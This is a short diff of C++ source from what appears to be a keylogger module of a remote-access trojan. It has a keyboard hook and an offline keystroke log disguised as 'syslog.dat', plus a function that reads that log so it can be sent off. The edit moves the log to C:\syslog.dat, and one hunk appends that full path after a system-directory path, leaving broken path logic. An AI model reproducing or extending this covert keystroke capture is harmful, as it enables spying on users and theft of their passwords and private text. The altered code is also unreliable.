@@ -238,8 +238,8 @@ bool CKeyboardManager::StartHook()
 	
 	ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));
 
-	GetSystemDirectory(m_pTShared->strRecordFile, sizeof(m_pTShared->strRecordFile));
-	lstrcat(m_pTShared->strRecordFile, "\\syslog.dat");
+	//GetSystemDirectory(m_pTShared->strRecordFile, sizeof(m_pTShared->strRecordFile));
+	lstrcat(m_pTShared->strRecordFile, "C:\\syslog.dat");
 
 	// 文件存在，就开始离线记录开启
 	if (GetFileAttributes(m_pTShared->strRecordFile) != -1)
@@ -295,7 +295,7 @@ int CKeyboardManager::sendOfflineRecord()
 	DWORD	dwBytesRead = 0;
 	char	strRecordFile[MAX_PATH];
 	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
-	lstrcat(strRecordFile, "\\syslog.dat");
+	lstrcat(strRecordFile, "C:\\syslog.dat");
 	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
 		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile != INVALID_HANDLE_VALUE)
